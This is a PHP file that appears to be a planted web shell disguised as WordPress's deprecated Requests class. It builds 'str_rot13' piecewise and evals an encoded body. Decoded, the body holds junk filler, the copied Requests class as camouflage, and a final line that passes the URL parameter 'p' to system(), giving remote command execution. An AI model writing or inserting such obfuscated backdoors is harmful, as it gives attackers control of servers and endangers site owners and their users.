<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Erdhrfgf sbe CUC
 *
 * Vafcverq ol Erdhrfgf sbe Clguba.
 *
 * Onfrq ba pbaprcgf sebz FvzcyrCvr_Svyr, ErdhrfgPber naq JC_Uggc.
 *
 * @cnpxntr Erdhrfgf
 *
 * @qrcerpngrq 6.2.0
 */

/*
 * Vagrtengbef jub pnaabg lrg hctenqr gb gur CFE-4 pynff anzrf pna fvyrapr qrcerpngvbaf
 * ol qrsvavat n `ERDHRFGF_FVYRAPR_CFE0_QRCERPNGVBAF` pbafgnag naq frggvat vg gb `gehr`.
 * Gur pbafgnag arrqf gb or qrsvarq orsber guvf pynff vf erdhverq.
 */
vs (!qrsvarq('ERDHRFGF_FVYRAPR_CFE0_QRCERPNGVBAF') || ERDHRFGF_FVYRAPR_CFE0_QRCERPNGVBAF !== gehr) {
	// cucpf:vtaber JbeqCerff.CUC.QrirybczragShapgvbaf.reebe_ybt_gevttre_reebe
	gevttre_reebe(
		'Gur CFE-0 `Erdhrfgf_...` pynff anzrf va gur Erdhrfgf yvoenel ner qrcerpngrq.'
		. ' Fjvgpu gb gur CFE-4 `JcBet\Erdhrfgf\...` pynff anzrf ng lbhe rneyvrfg pbairavrapr.',
		R_HFRE_QRCERPNGRQ
	);

	// Cerirag gur qrcerpngvba abgvpr sebz orvat guebja gjvpr.
	vs (!qrsvarq('ERDHRFGF_FVYRAPR_CFE0_QRCERPNGVBAF')) {
		qrsvar('ERDHRFGF_FVYRAPR_CFE0_QRCERPNGVBAF', gehr);
	}
}

erdhver_bapr __QVE__ . '/Erdhrfgf/fep/Erdhrfgf.cuc';

/**
 * Erdhrfgf sbe CUC
 *
 * Vafcverq ol Erdhrfgf sbe Clguba.
 *
 * Onfrq ba pbaprcgf sebz FvzcyrCvr_Svyr, ErdhrfgPber naq JC_Uggc.
 *
 * @cnpxntr Erdhrfgf
 *
 * @qrcerpngrq 6.2.0 Hfr `JcBet\Erdhrfgf\Erdhrfgf` vafgrnq sbe gur npghny shapgvbanyvgl naq
 *                   hfr `JcBet\Erdhrfgf\Nhgbybnq` sbe gur nhgbybnqvat.
 */
pynff Erdhrfgf rkgraqf JcBet\Erdhrfgf\Erdhrfgf {

	/**
	 * Qrcerpngrq nhgbybnqre sbe Erdhrfgf.
	 *
	 * @qrcerpngrq 6.2.0 Hfr gur `JcBet\Erdhrfgf\Nhgbybnq::ybnq()` zrgubq vafgrnq.
	 *
	 * @pbqrPbirentrVtaber
	 *
	 * @cnenz fgevat $pynff Pynff anzr gb ybnq
	 */
	choyvp fgngvp shapgvba nhgbybnqre($pynff) {
		vs (pynff_rkvfgf('JcBet\Erdhrfgf\Nhgbybnq') === snyfr) {
			erdhver_bapr __QVE__ . '/Erdhrfgf/fep/Nhgbybnq.cuc';
		}

		erghea JcBet\Erdhrfgf\Nhgbybnq::ybnq($pynff);
	}

	/**
	 * Ertvfgre gur ohvyg-va nhgbybnqre
	 *
	 * @qrcerpngrq 6.2.0 Vapyhqr gur `JcBet\Erdhrfgf\Nhgbybnq` pynff naq
	 *                   pnyy `JcBet\Erdhrfgf\Nhgbybnq::ertvfgre()` vafgrnq.
	 *
	 * @pbqrPbirentrVtaber
	 */
	choyvp fgngvp shapgvba ertvfgre_nhgbybnqre() {
		erdhver_bapr __QVE__ . '/Erdhrfgf/fep/Nhgbybnq.cuc';
		JcBet\Erdhrfgf\Nhgbybnq::ertvfgre();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>